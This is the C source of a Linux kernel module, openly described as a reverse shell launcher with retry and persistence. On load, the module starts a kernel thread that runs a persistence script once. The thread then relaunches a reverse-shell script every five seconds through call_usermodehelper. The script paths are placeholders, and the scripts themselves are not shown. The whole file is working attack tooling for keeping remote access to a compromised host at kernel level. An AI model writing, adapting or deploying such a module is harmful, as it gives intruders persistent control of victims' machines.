#include <linux/module.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kmod.h>
#include <linux/sched.h>

static struct task_struct *revshell_thread;

static int revshell_function(void *data) {
    char *persistence_argv[] = {"/bin/bash", "/111111111111111111111111111/persistence.sh", NULL};
    char *revshell_argv[] = {"/bin/bash", "/111111111111111111111111111/revshell.sh", NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    // Lancer le script de persistance avant la boucle principale
    int ret = call_usermodehelper(persistence_argv[0], persistence_argv, envp, UMH_WAIT_EXEC);
    if (ret != 0) {
        printk(KERN_ERR "Error launching persistence.sh: %d\n", ret);
    } else {
        printk(KERN_INFO "Persistence script launched successfully.\n");
    }

    while (!kthread_should_stop()) {
        ret = call_usermodehelper(revshell_argv[0], revshell_argv, envp, UMH_WAIT_EXEC);
        if (ret != 0) {
            printk(KERN_ERR "Error launching revshell.sh: %d\n", ret);
        } else {
            printk(KERN_INFO "Reverse shell launched successfully.\n");
        }

        ssleep(5);
    }

    return 0;
}

static int __init lkm_init(void) {
    printk(KERN_INFO "Starting Reverse Shell LKM...\n");

    revshell_thread = kthread_run(revshell_function, NULL, "revshell_thread");
    if (IS_ERR(revshell_thread)) {
        printk(KERN_ERR "Failed to create thread.\n");
        return PTR_ERR(revshell_thread);
    }

    printk(KERN_INFO "Reverse shell thread started.\n");
    return 0;
}

static void __exit lkm_exit(void) {
    if (revshell_thread) {
        kthread_stop(revshell_thread);
        printk(KERN_INFO "Reverse shell thread stopped.\n");
    }

    printk(KERN_INFO "Reverse Shell LKM unloaded.\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor");
MODULE_DESCRIPTION("Reverse Shell Launcher with Retry and Persistence");
